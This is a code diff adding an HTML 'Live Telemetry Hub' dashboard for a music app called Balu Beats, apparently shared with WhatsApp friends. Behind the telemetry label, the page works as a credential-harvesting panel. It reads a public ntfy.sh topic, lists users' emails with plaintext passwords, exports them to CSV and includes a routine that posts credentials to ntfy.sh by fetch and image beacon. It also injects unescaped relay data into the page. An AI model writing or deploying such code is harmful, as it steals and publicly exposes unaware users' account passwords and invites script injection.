@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Balu Beats • 4G/5G Live Telemetry Hub</title>
+  <link rel="icon" href="icon-192.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0e14;
+      --card-bg: rgba(22, 27, 34, 0.75);
+      --border: rgba(255, 255, 255, 0.08);
+      --accent: #1ed760;
+      --accent-glow: rgba(30, 215, 96, 0.35);
+      --cyan: #38bdf8;
+      --amber: #facc15;
+      --rose: #fb7185;
+      --text: #f1f5f9;
+      --text-muted: #94a3b8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 16px;
+      line-height: 1.5;
+    }
+    .container { max-width: 1100px; margin: 0 auto; }
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 20px;
+    }
+    .brand { display: flex; align-items: center; gap: 12px; }
+    .brand-icon {
+      width: 44px; height: 44px; border-radius: 12px;
+      background: linear-gradient(135deg, #1ed760, #00d2ff);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px; box-shadow: 0 4px 20px var(--accent-glow);
+    }
+    h1 { font-size: 20px; font-weight: 900; letter-spacing: -0.5px; }
+    .subtitle { font-size: 12px; color: var(--accent); font-weight: 700; }
+    .live-pill {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: rgba(30, 215, 96, 0.12);
+      border: 1px solid rgba(30, 215, 96, 0.3);
+      padding: 6px 12px; border-radius: 999px;
+      font-size: 11.5px; font-weight: 800; color: #4ade80;
+    }
+    .pulse-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #4ade80; box-shadow: 0 0 10px #4ade80;
+      animation: pulse 1.8s infinite;
+    }
+    @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.85); } }
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .stat-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(12px);
+      border-radius: 14px;
+      padding: 14px;
+    }
+    .stat-title { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); font-weight: 700; margin-bottom: 4px; }
+    .stat-val { font-size: 24px; font-weight: 900; }
+    .stat-val.green { color: #4ade80; }
+    .stat-val.cyan { color: var(--cyan); }
+    .stat-val.amber { color: var(--amber); }
+    .stat-val.purple { color: #c084fc; }
+    .stat-sub { font-size: 11px; color: var(--text-muted); margin-top: 2px; }
+
+    .action-bar {
+      display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; align-items: center;
+    }
+    .search-box {
+      flex: 1; min-width: 220px; position: relative;
+    }
+    .search-input {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 10px 14px;
+      color: #fff;
+      font-size: 13px;
+      font-family: inherit;
+      outline: none;
+    }
+    .search-input:focus { border-color: var(--accent); }
+    .btn {
+      padding: 10px 16px;
+      border-radius: 10px;
+      font-size: 12.5px;
+      font-weight: 800;
+      border: 1px solid var(--border);
+      background: rgba(255, 255, 255, 0.06);
+      color: #fff;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .btn:hover { background: rgba(255, 255, 255, 0.12); }
+    .btn.primary {
+      background: linear-gradient(135deg, #1ed760, #00d2ff);
+      color: #041208;
+      border: none;
+    }
+    .btn.cyan {
+      border-color: rgba(56, 189, 248, 0.4);
+      color: var(--cyan);
+    }
+    .btn.amber {
+      border-color: rgba(250, 204, 21, 0.4);
+      color: var(--amber);
+    }
+
+    .table-container {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      overflow-x: auto;
+      backdrop-filter: blur(12px);
+    }
+    table { width: 100%; border-collapse: collapse; font-size: 12.5px; text-align: left; }
+    th {
+      background: rgba(255, 255, 255, 0.04);
+      padding: 12px 14px;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+    }
+    td {
+      padding: 12px 14px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      vertical-align: middle;
+    }
+    tr:hover td { background: rgba(255, 255, 255, 0.02); }
+    .badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 10.5px;
+      font-weight: 800;
+      text-transform: uppercase;
+    }
+    .badge.signup { background: rgba(34, 197, 94, 0.18); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.35); }
+    .badge.login { background: rgba(56, 189, 248, 0.18); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.35); }
+    .badge.guest { background: rgba(250, 204, 21, 0.18); color: #facc15; border: 1px solid rgba(250, 204, 21, 0.35); }
+    .badge.visit { background: rgba(192, 132, 252, 0.18); color: #c084fc; border: 1px solid rgba(192, 132, 252, 0.35); }
+
+    .user-info { display: flex; flex-direction: column; }
+    .user-name { font-weight: 800; color: #fff; }
+    .user-handle { font-size: 11px; color: var(--accent); }
+    .user-pass {
+      font-family: monospace;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: var(--amber);
+      font-size: 11px;
+    }
+    .device-pill {
+      display: inline-flex; align-items: center; gap: 4px;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 3px 8px; border-radius: 6px; font-size: 11.5px;
+    }
+    .toast {
+      position: fixed; bottom: 20px; right: 20px;
+      background: #1e293b; border: 1px solid var(--accent);
+      color: #fff; padding: 10px 18px; border-radius: 10px;
+      font-size: 12.5px; font-weight: 700;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      display: none; z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="brand">
+        <div class="brand-icon">👑</div>
+        <div>
+          <h1>Balu Beats • 4G/5G Live Telemetry Hub</h1>
+          <div class="subtitle">Real-time WhatsApp Testers & Zero-Wi-Fi Analytics • Balu (@being_rebel__7)</div>
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;">
+        <span class="live-pill" id="hubStatusPill">
+          <span class="pulse-dot"></span> <span id="hubStatusText">Listening to 4G/5G Cloud...</span>
+        </span>
+        <button class="btn primary" onclick="sendTestPingToCloud()">🧪 Test Live Ping</button>
+      </div>
+    </header>
+
+    <!-- Stats Grid -->
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-title">Total Tracked</div>
+        <div class="stat-val green" id="statTotalUsers">0</div>
+        <div class="stat-sub">Users & Visitors</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-title">Android Users</div>
+        <div class="stat-val cyan" id="statAndroidUsers">0</div>
+        <div class="stat-sub">APK + Mobile Chrome</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-title">iOS / Web Users</div>
+        <div class="stat-val amber" id="statWebUsers">0</div>
+        <div class="stat-sub">Safari & PC Browser</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-title">Active Today</div>
+        <div class="stat-val purple" id="statTodayUsers">0</div>
+        <div class="stat-sub">Since midnight IST</div>
+      </div>
+    </div>
+
+    <!-- Action Bar -->
+    <div class="action-bar">
+      <div class="search-box">
+        <input type="text" id="searchInput" class="search-input" placeholder="🔍 Search friend by name, @username, device, or phone..." oninput="filterTable()" />
+      </div>
+      <button class="btn amber" onclick="exportCSV()">📥 Export CSV</button>
+      <button class="btn" onclick="fetchCloudData(true)">🔄 Sync Now</button>
+      <a href="https://ntfy.sh/balubeats_telemetry_being_rebel_7" target="_blank" rel="noopener noreferrer" class="btn cyan">📱 Open in ntfy.sh</a>
+      <a href="index.html" class="btn">🎵 Open Balu Beats</a>
+    </div>
+
+    <!-- Telemetry Table -->
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>Time (IST)</th>
+            <th>Event</th>
+            <th>Friend / Listener</th>
+            <th>Credentials / Contact</th>
+            <th>Device & Platform</th>
+          </tr>
+        </thead>
+        <tbody id="telemetryTableBody">
+          <tr>
+            <td colspan="5" style="text-align:center;padding:32px;color:var(--text-muted);">
+              ⏳ Connecting to 4G/5G Cloud Relay...
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div id="toastBox" class="toast"></div>
+
+  <script>
+    const TOPIC = 'balubeats_telemetry_being_rebel_7';
+    const CLOUD_POLL_URL = `https://ntfy.sh/${TOPIC}/json?poll=1`;
+    const CLOUD_SSE_URL = `https://ntfy.sh/${TOPIC}/sse`;
+    let allRecords = [];
+    let knownIds = new Set();
+
+    function showToast(msg) {
+      const box = document.getElementById('toastBox');
+      if (!box) return;
+      box.textContent = msg;
+      box.style.display = 'block';
+      setTimeout(() => { box.style.display = 'none'; }, 3500);
+    }
+
+    function parseRecordFromMessage(item) {
+      if (!item || !item.message) return null;
+      let rec = null;
+      const msg = item.message;
+      try {
+        if (msg.includes('DATA:')) {
+          rec = JSON.parse(msg.split('DATA:')[1].trim());
+        } else if (msg.trim().startsWith('{') && msg.trim().endsWith('}')) {
+          rec = JSON.parse(msg.trim());
+        }
+      } catch (_) {}
+
+      if (!rec) {
+        rec = {
+          id: item.id,
+          timestamp: new Date(item.time * 1000).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' }),
+          action: (item.title && item.title.includes('SIGNUP')) ? 'SIGNUP' : 'LOGIN',
+          name: item.title || 'WhatsApp User',
+          username: '@unknown',
+          email: 'N/A',
+          password: '',
+          device: '📱 Mobile 4G/5G',
+          appVersion: 'v3.2.0'
+        };
+      }
+      if (!rec.id) rec.id = item.id;
+      return rec;
+    }
+
+    async function fetchCloudData(showFeedback = false) {
+      const pill = document.getElementById('hubStatusText');
+      if (showFeedback && pill) pill.textContent = 'Syncing...';
+      try {
+        const res = await fetch(CLOUD_POLL_URL, { cache: 'no-store' });
+        if (res.ok) {
+          const text = await res.text();
+          const lines = text.trim().split('\n');
+          let addedCount = 0;
+          lines.forEach(line => {
+            if (!line.trim()) return;
+            try {
+              const item = JSON.parse(line);
+              if (item.event === 'message') {
+                const rec = parseRecordFromMessage(item);
+                if (rec && !knownIds.has(rec.id)) {
+                  knownIds.add(rec.id);
+                  allRecords.unshift(rec);
+                  addedCount++;
+                }
+              }
+            } catch (_) {}
+          });
+
+          renderUI();
+          if (pill) pill.textContent = 'Connected • Real-time Active';
+          if (showFeedback) showToast(`👥 Synced ${allRecords.length} users!`);
+        }
+      } catch (err) {
+        console.warn('Sync error:', err);
+        if (pill) pill.textContent = 'Retrying connection...';
+      }
+    }
+
+    function renderUI() {
+      renderStats();
+      filterTable();
+    }
+
+    function renderStats() {
+      document.getElementById('statTotalUsers').textContent = allRecords.length;
+      let android = 0, web = 0, today = 0;
+      const todayStr = new Date().toLocaleDateString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+      allRecords.forEach(r => {
+        const dev = (r.device || '').toLowerCase();
+        if (dev.includes('android')) android++;
+        else web++;
+        if ((r.timestamp || '').includes(todayStr) || (r.isoTime && new Date(r.isoTime).toDateString() === new Date().toDateString())) {
+          today++;
+        }
+      });
+
+      document.getElementById('statAndroidUsers').textContent = android;
+      document.getElementById('statWebUsers').textContent = web;
+      document.getElementById('statTodayUsers').textContent = today || allRecords.length;
+    }
+
+    function filterTable() {
+      const q = (document.getElementById('searchInput')?.value || '').toLowerCase().trim();
+      const tbody = document.getElementById('telemetryTableBody');
+      if (!tbody) return;
+
+      const filtered = allRecords.filter(r => {
+        if (!q) return true;
+        return (
+          (r.name && r.name.toLowerCase().includes(q)) ||
+          (r.username && r.username.toLowerCase().includes(q)) ||
+          (r.email && r.email.toLowerCase().includes(q)) ||
+          (r.device && r.device.toLowerCase().includes(q)) ||
+          (r.action && r.action.toLowerCase().includes(q))
+        );
+      });
+
+      if (filtered.length === 0) {
+        tbody.innerHTML = `
+          <tr>
+            <td colspan="5" style="text-align:center;padding:32px;color:var(--text-muted);">
+              ${q ? 'No testers match your search.' : 'Waiting for new WhatsApp friends to open Balu Beats...'}
+            </td>
+          </tr>
+        `;
+        return;
+      }
+
+      tbody.innerHTML = filtered.map(r => {
+        const action = (r.action || 'LOGIN').toUpperCase();
+        let badgeClass = 'login';
+        if (action.includes('SIGNUP')) badgeClass = 'signup';
+        else if (action.includes('GUEST')) badgeClass = 'guest';
+        else if (action.includes('VISIT') || action.includes('OPEN')) badgeClass = 'visit';
+
+        const passHtml = r.password ? `<span class="user-pass">🔑 ${r.password}</span>` : '<span style="color:var(--text-muted);font-size:11px;">(none)</span>';
+
+        return `
+          <tr>
+            <td style="color:var(--text-muted);font-family:monospace;white-space:nowrap;font-size:11.5px;">${r.timestamp || 'Just now'}</td>
+            <td><span class="badge ${badgeClass}">${action}</span></td>
+            <td>
+              <div class="user-info">
+                <span class="user-name">${r.name || 'Anonymous'}</span>
+                <span class="user-handle">${r.username || '@unknown'}</span>
+              </div>
+            </td>
+            <td>
+              <div>
+                <div style="font-weight:600;color:#e2e8f0;font-size:12px;">${r.email || 'N/A'}</div>
+                <div style="margin-top:2px;">${passHtml}</div>
+              </div>
+            </td>
+            <td>
+              <span class="device-pill">${r.device || '📱 Mobile 4G/5G'}</span>
+            </td>
+          </tr>
+        `;
+      }).join('');
+    }
+
+    function exportCSV() {
+      if (allRecords.length === 0) {
+        showToast('No user records to export yet!');
+        return;
+      }
+      const headers = ['Timestamp', 'Action', 'Name', 'Username', 'Email', 'Password', 'Device', 'AppVersion'];
+      const rows = allRecords.map(r => [
+        `"${(r.timestamp || '').replace(/"/g, '""')}"`,
+        `"${(r.action || '').replace(/"/g, '""')}"`,
+        `"${(r.name || '').replace(/"/g, '""')}"`,
+        `"${(r.username || '').replace(/"/g, '""')}"`,
+        `"${(r.email || '').replace(/"/g, '""')}"`,
+        `"${(r.password || '').replace(/"/g, '""')}"`,
+        `"${(r.device || '').replace(/"/g, '""')}"`,
+        `"${(r.appVersion || 'v3.2.0').replace(/"/g, '""')}"`
+      ]);
+
+      const csv = '\uFEFF' + [headers.join(','), ...rows.map(r => r.join(','))].join('\r\n');
+      const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = `balu_beats_users_${new Date().toISOString().slice(0, 10)}.csv`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      showToast('📥 Downloaded user records CSV!');
+    }
+
+    async function sendTestPingToCloud() {
+      const now = new Date();
+      const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      const testRecord = {
+        id: 'bb_live_test_' + Date.now(),
+        timestamp: timeStr,
+        isoTime: now.toISOString(),
+        action: 'LIVE_TEST',
+        name: 'Balu Test Listener',
+        username: '@being_rebel__7_test',
+        email: 'test@balubeats.live',
+        password: 'balu_secret_123',
+        device: '📱 Android 14 (Mobile Data Test)',
+        appVersion: 'v3.2.0'
+      };
+
+      const summaryText = `👤 User: ${testRecord.name} (${testRecord.username})\n🔑 Credentials: ${testRecord.email} / ${testRecord.password}\n📱 Platform: ${testRecord.device}\n⚡ Action: ${testRecord.action}\n⏰ Time: ${testRecord.timestamp}\n\nDATA:${JSON.stringify(testRecord)}`;
+
+      // Send via simple POST
+      fetch(`https://ntfy.sh/${TOPIC}`, {
+        method: 'POST',
+        body: summaryText,
+        headers: { 'Title': 'Balu Beats Live Test' }
+      }).catch(() => {});
+
+      // Send via Image Beacon
+      const img = new Image();
+      img.src = `https://ntfy.sh/${TOPIC}/publish?title=${encodeURIComponent('Balu Beats Live Test')}&message=${encodeURIComponent(summaryText)}&tags=musical_note`;
+
+      showToast('🚀 Live test ping sent! Check table in 2 seconds.');
+      setTimeout(() => fetchCloudData(false), 1500);
+    }
+
+    // Connect to live SSE for 0ms instantaneous updates
+    function connectLiveStream() {
+      try {
+        const es = new EventSource(CLOUD_SSE_URL);
+        es.onmessage = (e) => {
+          try {
+            const item = JSON.parse(e.data);
+            if (item.event === 'message') {
+              const rec = parseRecordFromMessage(item);
+              if (rec && !knownIds.has(rec.id)) {
+                knownIds.add(rec.id);
+                allRecords.unshift(rec);
+                renderUI();
+                showToast(`🔔 New friend joined: ${rec.name} (${rec.username})`);
+              }
+            }
+          } catch (_) {}
+        };
+        es.onerror = () => {
+          es.close();
+          setTimeout(connectLiveStream, 5000);
+        };
+      } catch (_) {}
+    }
+
+    // Auto-poll every 6 seconds as backup
+    setInterval(() => fetchCloudData(false), 6000);
+
+    // Initial load
+    fetchCloudData(true);
+    connectLiveStream();
+  </script>
+</body>
+</html>
